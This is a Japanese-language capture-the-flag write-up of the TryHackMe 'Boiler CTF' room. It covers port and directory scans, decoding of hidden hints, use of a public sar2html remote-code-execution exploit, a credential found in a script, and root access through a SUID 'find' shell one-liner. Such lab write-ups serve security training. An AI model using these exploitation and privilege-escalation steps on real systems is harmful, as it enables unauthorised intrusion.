# Boiler CTF

https://tryhackme.com/room/boilerctf2

## Enumeration

```shell
TARGET=10.201.110.71
sudo bash -c "echo $TARGET   boiler.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
10000/tcp open  snet-sensor-mgmt
55007/tcp open  unknown
```

```sh
sudo nmap -sS -sV -p21,80,10000,55007 $TARGET

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

FTP, SSH, HTTP * 2

### FTP

テキストファイルをダウンロード

```sh
ftp> ls -al
229 Entering Extended Passive Mode (|||46454|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
229 Entering Extended Passive Mode (|||42233|)
150 Opening BINARY mode data connection for .info.txt (74 bytes).
100% |***********************************************************************|    74      410.59 KiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (0.21 KiB/s)
```

```sh
$ cat .info.txt 
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

ROT13

```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

### Miniserv

HTTPレスポンスに `MiniServ: 1.930` が返っている。  

このバージョンのExploitは無い。

```
$ searchsploit webmin  
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                   | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                  | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                              | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                          | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                 | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                       | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                           | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                      | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)             | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                           | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                              | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)            | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                              | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                 | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                   | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                        | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                  | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution (Authenticated)                              | linux/webapps/50809.py
Webmin 1.996 - Remote Code Execution (RCE) (Authenticated)                        | linux/webapps/50998.py
Webmin 1.x - HTML Email Command Execution                                         | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                      | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                      | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                     | linux/webapps/47330.rb
Webmin Usermin 2.100 - Username Enumeration                                       | perl/webapps/52114.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### 80ポート

/joomla, /manual, /robots.txt を発見

```sh
$ dirsearch -u http://boiler.thm/
[19:30:00] 301 -  309B  - /joomla  ->  http://boiler.thm/joomla/            
[19:30:00] 301 -  323B  - /joomla/administrator  ->  http://boiler.thm/joomla/administrator/
[19:30:00] 200 -    4KB - /joomla/                                          
[19:30:08] 301 -  309B  - /manual  ->  http://boiler.thm/manual/            
[19:30:08] 200 -  201B  - /manual/index.html                                
[19:30:33] 200 -  178B  - /robots.txt
```

#### robots.txt

```sh
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

ディレクトリ名っぽいものはアクセスしてみたが存在しない。

最後の数列をASCII変換すると `OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK`。これをBase64デコードすると、`99b0660cd95adea327c54182baa51584`。

hashcatを実行すると、`kidding` のMD5ハッシュだった。

バージョン

http://boiler.thm/joomla/language/en-GB/en-GB.xml

`3.9.12` のエクスプロイトは見つからなかった。

```xml
<metafile version="3.8" client="site">
<name>English (en-GB)</name>
<version>3.9.12</version>
<creationDate>August 2019</creationDate>
<author>Joomla! Project</author>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<copyright>Copyright (C) 2005 - 2019 Open Source Matters. All rights reserved.</copyright>
<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
<description>
<![CDATA[ en-GB site language ]]>
</description>
<metadata>
<name>English (en-GB)</name>
<nativeName>English (United Kingdom)</nativeName>
<tag>en-GB</tag>
<rtl>0</rtl>
<locale>en_GB.utf8, en_GB.UTF-8, en_GB, eng_GB, en, english, english-uk, uk, gbr, britain, england, great britain, uk, united kingdom, united-kingdom</locale>
<firstDay>0</firstDay>
<weekEnd>0,6</weekEnd>
<calendar>gregorian</calendar>
</metadata>
<params/>
</metafile>
```

#### ディレクトリ列挙

/joomla以下を検索

```sh
root@ip-10-201-8-139:~# gobuster dir -q -x=txt,php -u http://$TARGET/joomla -w ./dirlist.txt -t 64 -k
/administrator        (Status: 301) [Size: 329] [--> http://10.201.110.71/joomla/administrator/]
/_archive             (Status: 301) [Size: 324] [--> http://10.201.110.71/joomla/_archive/]
/bin                  (Status: 301) [Size: 319] [--> http://10.201.110.71/joomla/bin/]
/build                (Status: 301) [Size: 321] [--> http://10.201.110.71/joomla/build/]
/cache                (Status: 301) [Size: 321] [--> http://10.201.110.71/joomla/cache/]
/cli                  (Status: 301) [Size: 319] [--> http://10.201.110.71/joomla/cli/]
/components           (Status: 301) [Size: 326] [--> http://10.201.110.71/joomla/components/]
/configuration.php    (Status: 200) [Size: 0]
/_database            (Status: 301) [Size: 325] [--> http://10.201.110.71/joomla/_database/]
/_files               (Status: 301) [Size: 322] [--> http://10.201.110.71/joomla/_files/]
/htaccess.txt         (Status: 200) [Size: 3159]
/images               (Status: 301) [Size: 322] [--> http://10.201.110.71/joomla/images/]
/includes             (Status: 301) [Size: 324] [--> http://10.201.110.71/joomla/includes/]
/installation         (Status: 301) [Size: 328] [--> http://10.201.110.71/joomla/installation/]
/language             (Status: 301) [Size: 324] [--> http://10.201.110.71/joomla/language/]
/index.php            (Status: 200) [Size: 12484]
/layouts              (Status: 301) [Size: 323] [--> http://10.201.110.71/joomla/layouts/]
/libraries            (Status: 301) [Size: 325] [--> http://10.201.110.71/joomla/libraries/]
/LICENSE.txt          (Status: 200) [Size: 18092]
/media                (Status: 301) [Size: 321] [--> http://10.201.110.71/joomla/media/]
/modules              (Status: 301) [Size: 323] [--> http://10.201.110.71/joomla/modules/]
/plugins              (Status: 301) [Size: 323] [--> http://10.201.110.71/joomla/plugins/]
/README.txt           (Status: 200) [Size: 4793]
/templates            (Status: 301) [Size: 325] [--> http://10.201.110.71/joomla/templates/]
/_test                (Status: 301) [Size: 321] [--> http://10.201.110.71/joomla/_test/]
/tests                (Status: 301) [Size: 321] [--> http://10.201.110.71/joomla/tests/]
/tmp                  (Status: 301) [Size: 319] [--> http://10.201.110.71/joomla/tmp/]
/~www                 (Status: 301) [Size: 320]
```

/_test で `sar2html` の見たことない画面が表示された。

### sar2html

tarファイルをダウンロードして展開すると、レポートのテキストファイルだった。  
逆にアップロードすることもできるらしい。

デプロイされているバージョンは分からないが、sar2html のRCEがあった。

```sh
$ searchsploit sar2html
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Execution                                                                                                                                                             | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution                                                                                                                                                                 | php/webapps/47204.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

コマンド実行できた。

```sh
$ python ./49344.py 
Enter The url => http://boiler.thm/joomla/_test/
Command => ls -al
HPUX
Linux
SunOS
total 124
drwxr-xr-x  3 www-data www-data  4096 Aug 22  2019 .
drwxr-xr-x 25 www-data www-data  4096 Aug 22  2019 ..
-rwxr-xr-x  1 www-data www-data 53430 Aug 22  2019 index.php
-rwxr-xr-x  1 www-data www-data   716 Aug 21  2019 log.txt
-rwxr-xr-x  1 www-data www-data 53165 Mar 19  2019 sar2html
drwxr-xr-x  3 www-data www-data  4096 Aug 22  2019 sarFILE
```

```sh
Command => cat log.txt
HPUX
Linux
SunOS
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: [REDACTED]
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```

basterd ユーザーのSSHパスワードが判明した。


## 権限昇格

```sh
$ pwd
/home/basterd
$ ls -al
total 16
drwxr-x--- 3 basterd basterd 4096 Aug 22  2019 .
drwxr-xr-x 4 root    root    4096 Aug 22  2019 ..
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
drwx------ 2 basterd basterd 4096 Aug 22  2019 .cache
```

backup.sh に stoner ユーザーのパスワードが書かれていた。

```sh
$ cat ./backup.sh

...
USER=stoner
#[REDACTED]
...
```

## 権限昇格２

```sh
stoner@Vulnerable:~$ ls -al
total 16
drwxr-x--- 3 stoner stoner 4096 Aug 22  2019 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
```

find に SGIDが付いている。

```sh
stoner@Vulnerable:~$ find / -perm -u=s -type f -ls 2>/dev/null
   264453     40 -rwsr-xr-x   1 root     root        38900 Mar 26  2019 /bin/su
   276977     32 -rwsr-xr-x   1 root     root        30112 Jul 12  2016 /bin/fusermount
   260151     28 -rwsr-xr-x   1 root     root        26492 May 15  2019 /bin/umount
   260156     36 -rwsr-xr-x   1 root     root        34812 May 15  2019 /bin/mount
   260172     44 -rwsr-xr-x   1 root     root        43316 May  7  2014 /bin/ping6
   260171     40 -rwsr-xr-x   1 root     root        38932 May  7  2014 /bin/ping
   394226     16 -rwsr-xr-x   1 root     root        13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   416088     16 -rwsr-xr--   1 root     www-data    13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
   416085     16 -rwsr-xr--   1 root     www-data    13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
   260101     48 -rwsr-xr--   1 root     messagebus    46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   264108    504 -rwsr-xr-x   1 root     root         513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   260699      8 -rwsr-xr-x   1 root     root           5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   265132     36 -rwsr-xr-x   1 root     root          36288 Mar 26  2019 /usr/bin/newgidmap
   260428    228 -r-sr-xr-x   1 root     root         232196 Feb  8  2016 /usr/bin/find
```

root昇格成功

```sh
stoner@Vulnerable:~$ find . -exec /bin/sh -p \; -quit
# id
uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

```sh
# ls -al /root
total 12
drwx------  2 root root 4096 Aug 22  2019 .
drwxr-xr-x 22 root root 4096 Aug 22  2019 ..
-rw-r--r--  1 root root   29 Aug 21  2019 root.txt
# cat /root/root.txt
```

user.txt は・・・？

```sh
# find / -name 'user.txt'
# 
```

→ /home/stoner/.secret がそれだった。

## 振り返り

- 問題文で誘導されたから楽だったが、ウサギの穴だらけでノーヒントだったら結構難しかっただろうと思う。
- sar2html は初見。次からは見たらすぐ気づけると思う。
- user.txt は罠。

## Tags

#tags:joomla
